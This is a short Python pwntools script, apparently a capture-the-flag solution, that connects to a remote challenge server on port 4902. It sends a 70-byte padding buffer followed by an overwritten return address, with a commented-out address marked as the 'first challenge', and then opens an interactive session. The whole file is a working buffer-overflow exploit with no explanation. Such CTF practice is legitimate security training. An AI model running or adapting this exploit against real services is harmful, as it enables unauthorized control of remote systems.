from pwn import *

r = remote("thekidofarcrania.com", 4902)

payload = b'A'*70
# payload += b'\x86\x85\x04\x08'  # First challenge
payload += b'\xa3\x85\x48\x80'

r.sendline(payload)
r.interactive()